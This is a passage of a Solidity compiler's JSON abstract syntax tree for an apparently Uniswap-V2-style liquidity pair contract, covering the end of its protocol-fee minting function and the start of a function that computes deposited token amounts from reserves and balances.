																									},
																									"id": 1344,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2298,
																									"src": "4754:15:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 1349,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4754:37:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"id": 1350,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "mul",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2298,
																							"src": "4754:41:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																								"typeString": "function (uint256,uint256) pure returns (uint256)"
																							}
																						},
																						"id": 1352,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "4754:90:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4737:107:6"
																				},
																				{
																					"assignments": [
																						1355
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1355,
																							"name": "denominator",
																							"nodeType": "VariableDeclaration",
																							"scope": 1382,
																							"src": "4866:16:6",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 1354,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4866:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1366,
																					"initialValue": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"hexValue": "38",
																										"id": 1363,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "4917:1:6",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_8_by_1",
																											"typeString": "int_const 8"
																										},
																										"value": "8"
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_rational_8_by_1",
																											"typeString": "int_const 8"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 1361,
																										"name": "rootKLast",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 1332,
																										"src": "4903:9:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 1362,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2298,
																									"src": "4903:13:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 1364,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4903:16:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"hexValue": "3137",
																										"id": 1358,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "4895:2:6",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_17_by_1",
																											"typeString": "int_const 17"
																										},
																										"value": "17"
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_rational_17_by_1",
																											"typeString": "int_const 17"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 1356,
																										"name": "rootK",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 1320,
																										"src": "4885:5:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 1357,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2298,
																									"src": "4885:9:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 1359,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4885:13:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"id": 1360,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "add",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2248,
																							"src": "4885:17:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																								"typeString": "function (uint256,uint256) pure returns (uint256)"
																							}
																						},
																						"id": 1365,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "4885:35:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4866:54:6"
																				},
																				{
																					"assignments": [
																						1368
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1368,
																							"name": "liquidity",
																							"nodeType": "VariableDeclaration",
																							"scope": 1382,
																							"src": "4942:14:6",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 1367,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4942:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1372,
																					"initialValue": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1371,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1369,
																							"name": "numerator",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1342,
																							"src": "4959:9:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "/",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1370,
																							"name": "denominator",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1355,
																							"src": "4971:11:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "4959:23:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4942:40:6"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1375,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1373,
																							"name": "liquidity",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1368,
																							"src": "5008:9:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1374,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "5020:1:6",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_0_by_1",
																								"typeString": "int_const 0"
																							},
																							"value": "0"
																						},
																						"src": "5008:13:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1381,
																					"nodeType": "IfStatement",
																					"src": "5004:42:6",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 1377,
																									"name": "feeTo",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1296,
																									"src": "5029:5:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_address",
																										"typeString": "address"
																									}
																								},
																								{
																									"argumentTypes": null,
																									"id": 1378,
																									"name": "liquidity",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1368,
																									"src": "5036:9:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_address",
																										"typeString": "address"
																									},
																									{
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								],
																								"id": 1376,
																								"name": "_mint",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 125,
																								"src": "5023:5:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
																									"typeString": "function (address,uint256)"
																								}
																							},
																							"id": 1379,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "functionCall",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "5023:23:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_tuple$__$",
																								"typeString": "tuple()"
																							}
																						},
																						"id": 1380,
																						"nodeType": "ExpressionStatement",
																						"src": "5023:23:6"
																					}
																				}
																			]
																		}
																	}
																]
															}
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 1398,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mintFee",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1291,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1288,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1398,
												"src": "4286:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1287,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "4286:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1290,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1398,
												"src": "4313:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1289,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "4313:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4276:60:6"
									},
									"returnParameters": {
										"id": 1294,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1293,
												"name": "feeOn",
												"nodeType": "VariableDeclaration",
												"scope": 1398,
												"src": "4354:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1292,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4354:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4353:12:6"
									},
									"scope": 2224,
									"src": "4259:893:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1542,
										"nodeType": "Block",
										"src": "5326:1200:6",
										"statements": [
											{
												"assignments": [
													1408,
													1410,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1408,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5337:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1407,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "5337:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1410,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5356:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1409,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "5356:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1413,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1411,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1054,
														"src": "5379:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1412,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5379:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5336:56:6"
											},
											{
												"assignments": [
													1415
												],
												"declarations": [
													{
														"constant": false,
														"id": 1415,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5417:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1414,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5417:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1424,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1421,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "5466:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1420,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5458:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1422,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5458:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1417,
																	"name": "token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 968,
																	"src": "5440:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1416,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "5433:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1418,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5433:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1419,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "5433:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1423,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5433:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5417:55:6"
											},
											{
												"assignments": [
													1426
												],
												"declarations": [
													{
														"constant": false,
														"id": 1426,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5482:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1425,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5482:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1435,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1432,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "5531:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1431,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5523:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1433,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5523:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1428,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 970,
																	"src": "5505:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1427,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "5498:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1429,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5498:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1430,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "5498:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1434,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5498:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5482:55:6"
											},
											{
												"assignments": [
													1437
												],
												"declarations": [
													{
														"constant": false,
														"id": 1437,
														"name": "amount0",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5547:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1436,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5547:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1442,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1440,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1408,
															"src": "5575:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1438,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1415,
															"src": "5562:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1439,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2270,
														"src": "5562:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1441,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5562:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5547:38:6"
											},
											{
												"assignments": [
													1444
												],
												"declarations": [
													{
														"constant": false,
														"id": 1444,
														"name": "amount1",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5595:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1443,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5595:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1449,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1447,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1410,
															"src": "5623:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1445,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1426,
															"src": "5610:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1446,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2270,
														"src": "5610:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1448,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5610:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5595:38:6"
											},
											{
												"assignments": [
													1451
												],
												"declarations": [
													{
														"constant": false,
														"id": 1451,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5644:10:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1450,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "5644:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1456,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1453,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1408,
															"src": "5666:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1454,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1410,
															"src": "5677:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1452,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1398,
														"src": "5657:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1455,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5657:30:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5644:43:6"
											},
											{
												"assignments": [
													1458
												],
												"declarations": [
													{
														"constant": false,
														"id": 1458,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1542,
														"src": "5697:17:6",
														"stateVariable": false,
														"storageLocation": "default",
